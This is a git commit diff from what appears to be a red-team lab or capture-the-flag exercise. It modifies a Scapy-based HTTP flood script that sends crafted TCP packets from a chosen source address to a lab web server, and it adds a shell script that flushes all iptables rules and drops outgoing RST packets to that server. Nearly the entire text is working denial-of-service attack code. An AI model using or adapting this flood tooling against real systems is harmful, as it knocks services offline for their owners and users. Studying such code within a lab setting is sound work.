754ac29b9222c5d2c8f82a82deb21ce4159b04dc
Pivoz <43602900+Pivoz@users.noreply.github.com>
2020-11-17 13:39:42 +0100

    Modified HTTPflood.py to craft packets as curl. Added restore_iptables.sh script for client nodes

--- resilient_cctf/red_task/scripts/HTTPflood.py
+++ resilient_cctf/red_task/scripts/HTTPflood.py
@@ -11,7 +11,7 @@ if __name__ == "__main__":
         
         getStr = 'GET /{}.html HTTP/1.1\r\nHost: 10.1.5.2\r\nUser-Agent: curl/7.58.0\r\nAccept: */*\r\n\r\n'.format(random.randint(1,9))
 
-        packet = IP(src=source, dst="10.1.5.2")/TCP(sport=random.randint(10000,60000), dport=80)/getStr
+        packet = IP(src=source, dst="10.1.5.2")/TCP(seq=random.randint(41058789,3209640057), sport=random.randint(10000,60000), dport=80, window=64240)
         send(packet)
 
         if len(sys.argv)>1 and sys.argv[1]=="-v":
---
+++ resilient_cctf/red_task/scripts/restore_iptables.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+
+sudo iptables -F
+sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.1.5.2 -j DROP
